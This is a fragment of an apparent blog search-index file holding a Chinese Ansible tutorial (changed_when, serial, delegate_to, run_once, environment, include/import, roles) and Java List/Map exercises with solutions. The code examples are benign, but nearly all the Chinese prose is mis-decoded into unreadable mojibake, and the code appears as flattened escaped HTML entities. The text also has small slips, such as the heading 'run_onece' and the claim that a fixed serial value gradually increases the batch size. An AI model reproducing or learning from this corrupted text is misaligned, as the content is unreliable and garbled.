‡è®°ä¸ºæœªæ›´æ”¹ã€‚\nä»¥ä¸‹æ˜¯ changed_when çš„åŸºæœ¬è¯­æ³•ï¼š\n- name: Task with custom change condition some_module: # Replace with the actual module you\u0026#39;re using # module arguments... changed_when: condition_expression åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œsome_module æ˜¯è¦æ‰§è¡Œçš„ä»»åŠ¡æ¨¡å—ï¼Œcondition_expression æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰æ¡ä»¶è¡¨è¾¾å¼ï¼Œç”¨äºåˆ¤æ–­æ˜¯å¦å°†ä»»åŠ¡æ ‡è®°ä¸ºå·²æ›´æ”¹ã€‚\nè¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨ changed_when æ§åˆ¶ä»»åŠ¡æ˜¯å¦è¢«æ ‡è®°ä¸ºå·²æ›´æ”¹ï¼š\n- name: Run a command and control changed status command: echo \u0026#34;Hello, world!\u0026#34; register: command_output changed_when: \u0026#34;command_output.stdout != \u0026#39;Hello, world!\\n\u0026#39;\u0026#34; åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œcommand æ¨¡å—æ‰§è¡Œä¸€ä¸ªå‘½ä»¤æ¥è¾“å‡º \u0026ldquo;Hello, world!\u0026quot;ï¼Œå¹¶å°†è¾“å‡ºç»“æœå­˜å‚¨åœ¨ command_output å˜é‡ä¸­ã€‚é€šè¿‡ä½¿ç”¨ changed_whenï¼Œæˆ‘ä»¬æŒ‡å®šäº†ä¸€ä¸ªæ¡ä»¶è¡¨è¾¾å¼ï¼Œåªæœ‰å½“å‘½ä»¤çš„è¾“å‡ºä¸ç­‰äº \u0026ldquo;Hello, world!\\n\u0026rdquo; æ—¶ï¼Œè¯¥ä»»åŠ¡æ‰ä¼šè¢«æ ‡è®°ä¸ºå·²æ›´æ”¹ã€‚\né€šè¿‡ä½¿ç”¨ changed_whenï¼Œä½ å¯ä»¥æ›´ç²¾ç¡®åœ°æ§åˆ¶ä»»åŠ¡çš„æ›´æ”¹çŠ¶æ€ï¼Œè€Œä¸å—é»˜è®¤çŠ¶æ€å˜åŒ–æ£€æµ‹çš„é™åˆ¶ã€‚è¿™åœ¨æŸäº›æƒ…å†µä¸‹å¾ˆæœ‰ç”¨ï¼Œç‰¹åˆ«æ˜¯å½“ä»»åŠ¡çš„çŠ¶æ€å˜åŒ–å¯èƒ½ä¸ç›´æ¥ä¸è¾“å‡ºç»“æœç›¸å…³æ—¶ã€‚\n3.13 æ»šåŠ¨æ‰§è¡Œ serial æ»šåŠ¨æ‰§è¡Œï¼ˆRolling Deploymentï¼‰æ˜¯ä¸€ç§è½¯ä»¶éƒ¨ç½²ç­–ç•¥ï¼Œç”¨äºå°†æ–°ç‰ˆæœ¬çš„è½¯ä»¶é€æ­¥éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§å°†æ‰€æœ‰å®ä¾‹éƒ½æ›´æ–°ä¸ºæ–°ç‰ˆæœ¬ã€‚è¿™ç§éƒ¨ç½²ç­–ç•¥æ—¨åœ¨å‡å°‘é£é™©ï¼Œç¡®ä¿ç³»ç»Ÿçš„å¯ç”¨æ€§å’Œç¨³å®šæ€§ï¼Œå› ä¸ºå¦‚æœåœ¨å…¨é¢éƒ¨ç½²æ–°ç‰ˆæœ¬åå‡ºç°é—®é¢˜ï¼Œå¯èƒ½ä¼šå½±å“æ•´ä¸ªç³»ç»Ÿã€‚\nåœ¨æ»šåŠ¨æ‰§è¡Œä¸­ï¼Œæ–°ç‰ˆæœ¬çš„è½¯ä»¶ä¼šé¦–å…ˆéƒ¨ç½²åˆ°ä¸€å°éƒ¨åˆ†æœåŠ¡å™¨ï¼ˆé€šå¸¸æ˜¯ä¸€ç»„ï¼‰ä¸Šï¼Œç„¶åè¿›è¡Œæµ‹è¯•å’ŒéªŒè¯ã€‚ä¸€æ—¦æ–°ç‰ˆæœ¬åœ¨è¿™äº›æœåŠ¡å™¨ä¸Šå¾—åˆ°ç¡®è®¤ï¼Œå°±ä¼šé€æ­¥å°†æ–°ç‰ˆæœ¬åº”ç”¨äºå…¶ä»–æœåŠ¡å™¨ï¼Œé€æ­¥å¢åŠ æœåŠ¡å™¨æ•°é‡ï¼Œç›´åˆ°æ‰€æœ‰æœåŠ¡å™¨éƒ½å®Œæˆäº†å‡çº§ã€‚\nåœ¨ Ansible ä¸­ï¼Œä½ å¯ä»¥é€šè¿‡ç¼–å†™é€‚å½“çš„å‰§æœ¬ï¼ˆplaybookï¼‰å’Œä»»åŠ¡ï¼Œä»¥åŠä½¿ç”¨ serial å‚æ•°æ¥å®ç°æ»šåŠ¨æ‰§è¡Œã€‚serial å‚æ•°å…è®¸ä½ æŒ‡å®šæ¯æ¬¡åœ¨å¤šå°‘ä¸ªç›®æ ‡ä¸»æœºä¸Šè¿è¡Œä»»åŠ¡ã€‚è¿™ä½¿å¾—ä½ å¯ä»¥æ§åˆ¶åœ¨ä¸€æ¬¡éƒ¨ç½²ä¸­é€æ­¥æ›´æ–°å¤šå°‘å°ä¸»æœºã€‚\nä»¥ä¸‹æ˜¯ä½¿ç”¨ Ansible å®ç°æ»šåŠ¨æ‰§è¡Œçš„ç¤ºä¾‹ï¼š\n- name: Rolling deployment with Ansible hosts: target_hosts serial: 2 # Number of hosts to update simultaneously in each batch tasks: - name: Deploy new version some_module: # Replace with the actual module you\u0026#39;re using # module arguments... åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œserial: 2 è¡¨ç¤ºæ¯æ¬¡å°†åŒæ—¶åœ¨ä¸¤å°ç›®æ ‡ä¸»æœºä¸Šè¿è¡Œä»»åŠ¡ã€‚è¿™ä¼šä½¿å¾—æ¯æ¬¡éƒ¨ç½²åªæ›´æ–°ä¸¤å°ä¸»æœºï¼Œç„¶åé€æ­¥å¢åŠ æ›´æ–°æ•°é‡ï¼Œç›´åˆ°æ‰€æœ‰ç›®æ ‡ä¸»æœºéƒ½å®Œæˆå‡çº§ã€‚\nè¯·æ³¨æ„ï¼Œå®é™…çš„æ»šåŠ¨æ‰§è¡Œç­–ç•¥å¯èƒ½å› ç»„ç»‡çš„éœ€æ±‚å’Œåº”ç”¨ç¨‹åºçš„ç‰¹æ€§è€Œæœ‰æ‰€ä¸åŒã€‚ä½ å¯ä»¥æ ¹æ®å®é™…æƒ…å†µæ¥è°ƒæ•´ serial å‚æ•°çš„å€¼ä»¥åŠéƒ¨ç½²ä»»åŠ¡çš„å…¶ä»–å‚æ•°ï¼Œä»¥æ»¡è¶³ä½ çš„éƒ¨ç½²ç­–ç•¥å’Œå¯ç”¨æ€§è¦æ±‚ã€‚\n3.14 delegate_to åœ¨ Ansible ä¸­ï¼Œdelegate_to æ˜¯ä¸€ä¸ªç”¨äºæŒ‡å®šä»»åŠ¡åº”è¯¥åœ¨å“ªä¸ªè¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œçš„å‚æ•°ã€‚é€šè¿‡ä½¿ç”¨ delegate_toï¼Œä½ å¯ä»¥å°†ä»»åŠ¡å§”æ‰˜ç»™ä¸€ä¸ªç‰¹å®šçš„ä¸»æœºæ‰§è¡Œï¼Œè€Œä¸æ˜¯é»˜è®¤åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œã€‚\nè¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨ delegate_to å°†ä»»åŠ¡å§”æ‰˜ç»™å¦ä¸€ä¸ªä¸»æœºæ‰§è¡Œï¼š\n- name: Run a task on a specific host command: echo \u0026#34;This task runs on a different host\u0026#34; delegate_to: specific_host åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œcommand æ¨¡å—å°†æ‰§è¡Œ echo å‘½ä»¤ï¼Œä½†æ˜¯ä»»åŠ¡ä¼šè¢«å§”æ‰˜ç»™ specific_host æ‰§è¡Œï¼Œè€Œä¸æ˜¯é»˜è®¤çš„ç›®æ ‡ä¸»æœºã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œdelegate_to å‚æ•°é€šå¸¸ç”¨äºç‰¹å®šçš„æƒ…å†µï¼Œä¾‹å¦‚éœ€è¦åœ¨ç‰¹å®šä¸»æœºä¸Šæ‰§è¡Œä¸€äº›é…ç½®ç®¡ç†ä»»åŠ¡ã€æ”¶é›†ä¿¡æ¯æˆ–æ‰§è¡ŒæŸäº›æ•…éšœæ’é™¤æ“ä½œæ—¶ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä»»åŠ¡å°†åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œï¼Œè€Œä¸éœ€è¦ä½¿ç”¨ delegate_toã€‚\n3.15 run_onece åœ¨ Ansible ä¸­ï¼Œrun_once æ˜¯ä¸€ä¸ªç”¨äºæ§åˆ¶ä»»åŠ¡æ˜¯å¦ä»…åœ¨ä¸€ä¸ªä¸»æœºä¸Šè¿è¡Œçš„å‚æ•°ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼ŒAnsible ä¼šåœ¨ç›®æ ‡ä¸»æœºä¸Šçš„æ¯ä¸ªä¸»æœºä¸Šè¿è¡Œä»»åŠ¡ã€‚ä½†æ˜¯ï¼Œæœ‰æ—¶ä½ å¯èƒ½åªå¸Œæœ›åœ¨æ‰€æœ‰ç›®æ ‡ä¸»æœºä¸­çš„ä¸€ä¸ªä¸Šè¿è¡Œä»»åŠ¡ï¼Œè€Œä¸æ˜¯åœ¨æ¯ä¸ªä¸»æœºä¸Šéƒ½è¿è¡Œã€‚\nè¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨ run_once ä½¿ä»»åŠ¡åªåœ¨ä¸€ä¸ªä¸»æœºä¸Šè¿è¡Œï¼š\n- name: Run a task only once command: echo \u0026#34;This task runs only once\u0026#34; run_once: true åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œcommand æ¨¡å—ä¼šæ‰§è¡Œ echo å‘½ä»¤ï¼Œä½†æ˜¯è¯¥ä»»åŠ¡åªä¼šåœ¨ç›®æ ‡ä¸»æœºä¸­çš„ä¸€ä¸ªä¸»æœºä¸Šè¿è¡Œã€‚\nä½¿ç”¨ run_once å‚æ•°é€šå¸¸ç”¨äºä¸€äº›åªéœ€åœ¨æ•´ä¸ªå‰§æœ¬ä¸­æ‰§è¡Œä¸€æ¬¡çš„ä»»åŠ¡ï¼Œä¾‹å¦‚æ”¶é›†æ±‡æ€»ä¿¡æ¯æˆ–é…ç½®åˆå§‹åŒ–ã€‚æ³¨æ„ï¼Œrun_once å¹¶ä¸ä¼šå½±å“å…¶ä»–ä»»åŠ¡çš„æ‰§è¡Œæ–¹å¼ï¼Œå…¶ä»–ä»»åŠ¡ä»ç„¶ä¼šåœ¨æ¯ä¸ªç›®æ ‡ä¸»æœºä¸Šè¿è¡Œã€‚\n3.16 ç¯å¢ƒå˜é‡ environment åœ¨ Ansible ä¸­ï¼Œenvironment æ˜¯ä¸€ä¸ªå‚æ•°ï¼Œç”¨äºåœ¨ä»»åŠ¡çº§åˆ«è®¾ç½®ç¯å¢ƒå˜é‡ã€‚é€šè¿‡ä½¿ç”¨ environment å‚æ•°ï¼Œä½ å¯ä»¥ä¸ºä»»åŠ¡è®¾ç½®ç‰¹å®šçš„ç¯å¢ƒå˜é‡ï¼Œè¿™äº›å˜é‡å°†åœ¨ä»»åŠ¡æ‰§è¡ŒæœŸé—´å¯¹å‘½ä»¤ã€è„šæœ¬ç­‰æ“ä½œäº§ç”Ÿå½±å“ã€‚\nè¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨ environment å‚æ•°è®¾ç½®ç¯å¢ƒå˜é‡ï¼š\n- name: Run a task with custom environment variables command: echo \u0026#34;VAR1 is $VAR1, VAR2 is $VAR2\u0026#34; environment: VAR1: value1 VAR2: value2 åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œcommand æ¨¡å—ä¼šæ‰§è¡Œ echo å‘½ä»¤ï¼Œæ‰“å°å‡ºç”± environment å‚æ•°æŒ‡å®šçš„ç¯å¢ƒå˜é‡å€¼ã€‚\nä½¿ç”¨ environment å‚æ•°å¯ä»¥è®©ä½ åœ¨ä»»åŠ¡æ‰§è¡Œè¿‡ç¨‹ä¸­è®¾ç½®ä¸´æ—¶ç¯å¢ƒå˜é‡ï¼Œè¿™å¯¹äºå®šåˆ¶ä»»åŠ¡è¡Œä¸ºã€ä¼ é€’é…ç½®ä¿¡æ¯æˆ–è®¾ç½®æ‰§è¡Œç¯å¢ƒéå¸¸æœ‰ç”¨ã€‚è¿™äº›ç¯å¢ƒå˜é‡åªä¼šåœ¨ä»»åŠ¡æ‰§è¡ŒæœŸé—´ç”Ÿæ•ˆï¼Œä¸ä¼šå½±å“åˆ°å…¶ä»–ä»»åŠ¡æˆ–ç›®æ ‡ä¸»æœºçš„çŠ¶æ€ã€‚\n3.17 include å’Œ import åœ¨ Ansible ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ include å’Œ import è¯­å¥æ¥å®ç° YAML æ–‡ä»¶ä¹‹é—´çš„ç›¸äº’è°ƒç”¨å’Œé‡ç”¨ã€‚è¿™å¯ä»¥å¸®åŠ©ä½ ç»„ç»‡å’Œç®¡ç†å¤§å‹çš„ Ansible å‰§æœ¬ï¼Œä½¿å…¶æ›´åŠ æ¨¡å—åŒ–å’Œæ˜“äºç»´æŠ¤ã€‚\nä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œæ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ include å’Œ import_playbook æ¥å®ç° YAML æ–‡ä»¶ä¹‹é—´çš„ç›¸äº’è°ƒç”¨å’Œé‡ç”¨ã€‚\nå‡è®¾æˆ‘ä»¬æœ‰ä»¥ä¸‹æ–‡ä»¶ç»“æ„ï¼š\nansible_project/ â”œâ”€â”€ main_playbook.yml â”œâ”€â”€ tasks/ â”‚ â”œâ”€â”€ common_tasks.yml â”‚ â”œâ”€â”€ task1.yml â”‚ â””â”€â”€ task2.yml â””â”€â”€ playbooks/ â””â”€â”€ other_playbook.yml main_playbook.yml æ˜¯ä¸»å‰§æœ¬æ–‡ä»¶ï¼Œå®ƒå¼•å…¥äº†å…¶ä»–æ–‡ä»¶å¹¶å®šä¹‰äº†ä¸€äº›ä»»åŠ¡ã€‚ - name: Main Playbook hosts: target_hosts tasks: - include: tasks/common_tasks.yml - include: tasks/task1.yml - include: tasks/task2.yml - import_playbook: playbooks/other_playbook.yml common_tasks.yml æ–‡ä»¶åŒ…å«ä¸€äº›å…¬å…±ä»»åŠ¡ï¼Œè¿™äº›ä»»åŠ¡å¯ä»¥è¢«å¤šä¸ªå‰§æœ¬é‡ç”¨ã€‚ - name: Common Task 1 debug: msg: \u0026#34;This is a common task.\u0026#34; - name: Common Task 2 debug: msg: \u0026#34;Another common task.\u0026#34; task1.yml æ–‡ä»¶åŒ…å«ç‰¹å®šçš„ä»»åŠ¡ã€‚ - name: Task 1 debug: msg: \u0026#34;Task 1 is executed.\u0026#34; task2.yml æ–‡ä»¶ä¹ŸåŒ…å«ç‰¹å®šçš„ä»»åŠ¡ã€‚ - name: Task 2 debug: msg: \u0026#34;Task 2 is executed.\u0026#34; other_playbook.yml æ˜¯å¦ä¸€ä¸ªç‹¬ç«‹çš„å‰§æœ¬ã€‚ - name: Other Playbook hosts: other_hosts tasks: - name: Task in Other Playbook debug: msg: \u0026#34;This task is from another playbook.\u0026#34; åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œmain_playbook.yml å¼•å…¥äº†å¤šä¸ªæ–‡ä»¶å¹¶å®šä¹‰äº†ä¸€ç³»åˆ—ä»»åŠ¡ã€‚common_tasks.yml åŒ…å«äº†ä¸€äº›å…¬å…±ä»»åŠ¡ï¼Œè¿™äº›ä»»åŠ¡å¯ä»¥åœ¨ä¸»å‰§æœ¬å’Œå…¶ä»–å‰§æœ¬ä¸­é‡ç”¨ã€‚task1.yml å’Œ task2.yml åˆ†åˆ«åŒ…å«ç‰¹å®šçš„ä»»åŠ¡ã€‚other_playbook.yml æ˜¯å¦ä¸€ä¸ªç‹¬ç«‹çš„å‰§æœ¬ï¼Œå®ƒå¯ä»¥è¢«å¯¼å…¥åˆ°ä¸»å‰§æœ¬ä¸­ã€‚\né€šè¿‡è¿™ç§æ–¹å¼ï¼Œä½ å¯ä»¥å°† Ansible ä»£ç æ¨¡å—åŒ–ï¼Œæé«˜å¯ç»´æŠ¤æ€§ï¼Œå¹¶æ ¹æ®éœ€è¦é‡ç”¨ä»»åŠ¡å’Œå‰§æœ¬ã€‚\n4 Ansible Roles Ansible è§’è‰²æ˜¯ä¸€ç§ç”¨äºç»„ç»‡å’Œé‡ç”¨ Ansible ä»£ç çš„ç»“æ„åŒ–æ–¹å¼ã€‚è§’è‰²å…è®¸ä½ å°†ä»»åŠ¡ã€å˜é‡ã€æ¨¡æ¿å’Œå¤„ç†é€»è¾‘ç»„ç»‡æˆä¸€ä¸ªå¯ç‹¬ç«‹è°ƒç”¨çš„å•å…ƒï¼Œä½¿å¾—ä½ èƒ½å¤Ÿæ›´å¥½åœ°ç®¡ç†å¤æ‚çš„å‰§æœ¬å’Œéƒ¨ç½²ã€‚\nè§’è‰²çš„ç»„ç»‡ç»“æ„å¦‚ä¸‹ï¼š\nmy_role/ â”œâ”€â”€ tasks/ â”‚ â”œâ”€â”€ main.yml â”‚ â”œâ”€â”€ task1.yml â”‚ â””â”€â”€ task2.yml â”œâ”€â”€ vars/ â”‚ â””â”€â”€ main.yml â”œâ”€â”€ templates/ â”‚ â”œâ”€â”€ template1.j2 â”‚ â””â”€â”€ template2.j2 â””â”€â”€ meta/ â””â”€â”€ main.yml tasks/ ç›®å½•åŒ…å«ä¸»ä»»åŠ¡æ–‡ä»¶ main.ymlï¼Œä»¥åŠå…¶ä»–ä»»åŠ¡æ–‡ä»¶å¦‚ task1.yml å’Œ task2.ymlï¼Œè¿™äº›æ–‡ä»¶åŒ…å«è¦æ‰§è¡Œçš„ä»»åŠ¡ã€‚ vars/ ç›®å½•åŒ…å«å˜é‡æ–‡ä»¶ main.ymlï¼Œè¿™äº›å˜é‡å¯ä»¥åœ¨è§’è‰²ä¸­ä½¿ç”¨ã€‚ templates/ ç›®å½•åŒ…å«æ¨¡æ¿æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶å¯ä»¥åœ¨è§’è‰²ä¸­ä½¿ç”¨ä½œä¸ºé…ç½®æ–‡ä»¶æ¨¡æ¿ã€‚ meta/ ç›®å½•åŒ…å«è§’è‰²å…ƒæ•°æ®æ–‡ä»¶ main.ymlï¼Œå…¶ä¸­åŒ…å«æœ‰å…³è§’è‰²çš„ä¿¡æ¯ï¼Œå¦‚ä½œè€…ã€ä¾èµ–ç­‰ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•åˆ›å»ºå’Œä½¿ç”¨ Ansible è§’è‰²ã€‚\nåˆ›å»ºä¸€ä¸ªåä¸º my_role çš„è§’è‰²ç›®å½•ç»“æ„ï¼š ansible_project/ â””â”€â”€ roles/ â””â”€â”€ my_role/ â”œâ”€â”€ tasks/ â”‚ â””â”€â”€ main.yml â”œâ”€â”€ vars/ â”‚ â””â”€â”€ main.yml â”œâ”€â”€ templates/ â”‚ â””â”€â”€ template1.j2 â””â”€â”€ meta/ â””â”€â”€ main.yml ç¼–è¾‘ my_role/tasks/main.yml æ–‡ä»¶ï¼Œå®šä¹‰è¦æ‰§è¡Œçš„ä»»åŠ¡ï¼š - name: Task 1 in Role debug: msg: \u0026#34;Task 1 of my_role is executed.\u0026#34; - name: Task 2 in Role debug: msg: \u0026#34;Task 2 of my_role is executed.\u0026#34; ç¼–è¾‘ my_role/vars/main.yml æ–‡ä»¶ï¼Œå®šä¹‰è§’è‰²å˜é‡ï¼š role_var1: value1 role_var2: value2 ç¼–è¾‘ my_role/templates/template1.j2 æ–‡ä»¶ï¼Œåˆ›å»ºä¸€ä¸ªé…ç½®æ–‡ä»¶æ¨¡æ¿ï¼š [Section] var1 = {{ role_var1 }} var2 = {{ role_var2 }} ç¼–è¾‘ my_role/meta/main.yml æ–‡ä»¶ï¼Œå®šä¹‰è§’è‰²å…ƒæ•°æ®ï¼š galaxy_info: author: Your Name description: A sample Ansible role license: MIT min_ansible_version: 2.9 platforms: - name: Fedora versions: - all - name: Ubuntu versions: - all åœ¨ä¸»å‰§æœ¬ä¸­ä½¿ç”¨è§’è‰²ï¼š - name: Playbook using the role hosts: target_hosts roles: - my_role åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œmy_role è§’è‰²è¢«å®šä¹‰ä¸ºä¸€ä¸ªç‹¬ç«‹çš„ç›®å½•ï¼Œå…¶ä¸­åŒ…å«äº†ä»»åŠ¡ã€å˜é‡ã€æ¨¡æ¿å’Œå…ƒæ•°æ®ã€‚ä¸»å‰§æœ¬é€šè¿‡ roles éƒ¨åˆ†å¼•ç”¨äº†è¿™ä¸ªè§’è‰²ï¼Œå¹¶åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œäº†è§’è‰²ä¸­çš„ä»»åŠ¡å’Œæ“ä½œã€‚\nä½¿ç”¨è§’è‰²å¯ä»¥ä½¿ Ansible ä»£ç æ›´åŠ æ¨¡å—åŒ–ã€æ˜“äºç»´æŠ¤å’Œé‡ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤šä¸ªé¡¹ç›®ã€ç¯å¢ƒæˆ–åº”ç”¨ç¨‹åºæ—¶ã€‚\n","permalink":"https://senmer.github.io/zh/posts/tech/ansible/ansible/","summary":"1 Ansible ç®€ä»‹ 1.1 Ansible å‘å±•å² ä½œè€…ï¼šMichael DeHaanï¼ˆ Cobbler ä¸ Func ä½œè€…ï¼‰ Ansible çš„åç§°æ¥è‡ªç§‘å¹»å°è¯´ã€Šå®‰å¾·çš„æ¸¸æˆã€‹ä¸­è·¨è¶Šæ—¶ç©ºçš„å³æ—¶é€šä¿¡å·¥å…·ï¼Œä½¿ç”¨å®ƒå¯ä»¥åœ¨ç›¸è·æ•°å…‰å¹´çš„è·ç¦»ï¼Œè¿œç¨‹å®æ—¶æ§åˆ¶å‰çº¿çš„èˆ°é˜Ÿæˆ˜æ–—ã€‚ 2012-03-09ï¼Œå‘å¸ƒ0.0.1ç‰ˆï¼Œ2015-10-17ï¼ŒRed Hatå®£å¸ƒ1.5äº¿ç¾å…ƒæ”¶è´­An","title":"Ansible"},{"content":"ç¬¬ä¸€é¢˜ï¼šåˆ›å»ºä¸€ä¸ªListé›†åˆçš„å¯¹è±¡ï¼Œæ·»åŠ å‡ æ¡æ•°æ®ï¼Œå°†1å·ä½å’Œ2å·ä½äº¤æ¢ï¼›è·å¾—æœ€å¤§å€¼ï¼Œæœ€å°å€¼æ‰“å°å‡ºæ¥ï¼Œæœ€åå†éå†è¯¥é›†åˆå¹¶æŠŠå…ƒç´ æ‰“å°å‡ºæ¥\nç¬¬äºŒé¢˜ ç°åœ¨æœ‰ä¸€ä¸ªmapé›†åˆå¦‚ä¸‹ï¼š Map\u0026lt;Integer,String\u0026gt; map = new HashMap\u0026lt;Integer, String\u0026gt;(); map.put(1, \u0026ldquo;å¼ ä¸‰ä¸°\u0026rdquo;); map.put(2, \u0026ldquo;å‘¨èŠ·è‹¥\u0026rdquo;); map.put(3, \u0026ldquo;æ±ªå³°\u0026rdquo;); map.put(4, \u0026ldquo;ç­ç»å¸ˆå¤ª\u0026rdquo;); è¦æ±‚ï¼š 1.éå†é›†åˆï¼Œå¹¶å°†åºå·ä¸å¯¹åº”äººåæ‰“å°ã€‚ 2.å‘è¯¥mapé›†åˆä¸­æ’å…¥ä¸€ä¸ªç¼–ç ä¸º5å§“åä¸ºææ™“çº¢çš„ä¿¡æ¯ 3.ç§»é™¤è¯¥mapä¸­çš„ç¼–å·ä¸º1çš„ä¿¡æ¯ 4.å°†mapé›†åˆä¸­ç¼–å·ä¸º2çš„å§“åä¿¡æ¯ä¿®æ”¹ä¸ºå‘¨æ—\n1. å•åˆ—é›†åˆList import java.util.ArrayList; import java.util.Collections; public class ListDemo { public static void main(String[] args) { ArrayList\u0026lt;Integer\u0026gt; myList = new ArrayList\u0026lt;\u0026gt;(); myList.add(10); myList.add(20); myList.add(30); System.out.println(\u0026#34;é›†åˆä¸­çš„å…ƒç´ ä¸ºï¼š\u0026#34;); for(int i: myList) { System.out.println(i); } // äº¤æ¢å…ƒç´  Collections.swap(myList, 0, 1); // è·å¾—æœ€å¤§å€¼å’Œæœ€å°å€¼ int max = Collections.max(myList); int min = Collections.min(myList); System.out.println(\u0026#34;æœ€å¤§å€¼ï¼š\u0026#34; + max); System.out.println(\u0026#34;æœ€å°å€¼ï¼š\u0026#34; + min); // éå†é›†åˆä¸­çš„å…ƒç´  System.out.println(\u0026#34;äº¤æ¢åé›†åˆä¸­çš„å…ƒç´ ä¸ºï¼š\u0026#34;); for (int e : myList) { System.out.println(e); } } } ç¨‹åºè¾“å‡ºï¼š\né›†åˆä¸­çš„å…ƒç´ ä¸ºï¼š 10 20 30 æœ€å¤§å€¼ï¼š30 æœ€å°å€¼ï¼š10 äº¤æ¢åé›†åˆä¸­çš„å…ƒç´ ä¸ºï¼š 20 10 30 2. åŒåˆ—é›†åˆMap import java.util.HashMap; import java.util.Map; public class MapDemo { public static void main(String[] args) { HashMap\u0026lt;Integer,String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(1, \u0026#34;å¼ ä¸‰ä¸°\u0026#34;); map.put(2, \u0026#34;å‘¨èŠ·è‹¥\u0026#34;); map.put(3, \u0026#34;æ±ªå³°\u0026#34;); map.put(4, \u0026#34;ç­ç»å¸ˆå¤ª\u0026#34;); // éå†é›†åˆ for (Map.Entry\u0026lt;Integer, String\u0026gt; entry : map.entrySet()) { System.out.println(\u0026#34;åºå·ï¼š\u0026#34; + entry.getKey() + \u0026#34;ï¼Œå§“åï¼š\u0026#34; + entry.getValue()); } // æ’å…¥ä¿¡æ¯ map.put(5, \u0026#34;ææ™“çº¢\u0026#34;); // ç§»é™¤ä¿¡æ¯ map.remove(1); // ä¿®æ”¹ä¿¡æ¯ï¼Œå·²æœ‰ä¸ºä¿®æ”¹ï¼Œå¦åˆ™ä¸ºæ·»åŠ  map.put(2, \u0026#34;å‘¨æ—\u0026#34;); // éå†é›†åˆ System.out.println(\u0026#34;ä¿®æ”¹åçš„é›†åˆï¼š\u0026#34;); for (Map.Entry\u0026lt;Integer, String\u0026gt; entry : map.entrySet()) { System.out.println(\u0026#34;åºå·ï¼š\u0026#34; + entry.getKey() + \u0026#34;ï¼Œå§“åï¼š\u0026#34; + entry.getValue()); } } } ç¨‹åºè¾“å‡ºï¼š\nåºå·ï¼š1ï¼Œå§“åï¼šå¼ ä¸‰ä¸° åºå·ï¼š2ï¼Œå§“åï¼šå‘¨èŠ·è‹¥ åºå·ï¼š3ï¼Œå§“åï¼šæ±ªå³° åºå·ï¼š4ï¼Œå§“åï¼šç­ç»å¸ˆå¤ª ä¿®æ”¹åçš„é›†åˆï¼š åºå·ï¼š2ï¼Œå§“åï¼šå‘¨æ— åºå·ï¼š3ï¼Œå§“åï¼šæ±ªå³° åºå·ï¼š4ï¼Œå§“åï¼šç­ç»å¸ˆå¤ª åºå·ï¼š5ï¼Œå§“åï¼šææ™“çº¢ ","permalink":"https://senmer.github.io/zh/posts/tech/java/java-%E9%9B%86%E5%90%88/","summary":"\u003cp\u003eç¬¬ä¸€é¢˜ï¼šåˆ›å»ºä¸€ä¸ªListé›†åˆçš„å¯¹è±¡ï¼Œæ·»åŠ å‡ æ¡æ•°æ®ï¼Œå°†1å·ä½å’Œ2å·ä½äº¤æ¢ï¼›è·å¾—æœ€å¤§å€¼ï¼Œæœ€å°å€¼æ‰“å°å‡ºæ¥ï¼Œæœ€åå†éå†è¯¥é›†åˆå¹¶æŠŠå…ƒç´ æ‰“å°å‡ºæ¥\u003c/p\u003e\n\u003cp\u003eç¬¬äºŒé¢˜ ç°åœ¨æœ‰ä¸€ä¸ªmapé›†åˆå¦‚ä¸‹ï¼š\nMap\u0026lt;Integer,String\u0026gt; map = new HashMap\u0026lt;Integer, String\u0026gt;();\nmap.put(1, \u0026ldquo;å¼ ä¸‰ä¸°\u0026rdquo;);\nmap.put(2, \u0026ldquo;å‘¨èŠ·è‹¥\u0026rdquo;);\nmap.put(3, \u0026ldquo;æ±ªå³°\u0026rdquo;);\nmap.put(4, \u0026ldquo;ç­ç»å¸ˆå¤ª\u0026rdquo;);\nè¦æ±‚ï¼š\n1.éå†é›†åˆï¼Œå¹¶å°†åºå·ä¸å¯¹åº”äººåæ‰“å°ã€‚\n2.å‘è¯¥mapé›†åˆä¸­æ’å…¥ä¸€ä¸ªç¼–ç ä¸º5å§“åä¸ºææ™“çº¢çš„ä¿¡æ¯\n3.ç§»é™¤è¯¥mapä¸­çš„ç¼–å·ä¸º1çš„ä¿¡æ¯\n4.å°†mapé›†åˆä¸­ç¼–å·ä¸º2çš„å§“åä¿¡æ¯ä¿®æ”¹ä¸ºå‘¨æ—\u003c/p\u003e","title":"java-é›†åˆ"},{"content":"1ã€å®šä¹‰æ‰‹æœºç±»ï¼Œæ‰‹æœºæœ‰å“ç‰Œ(brand),ä»·æ 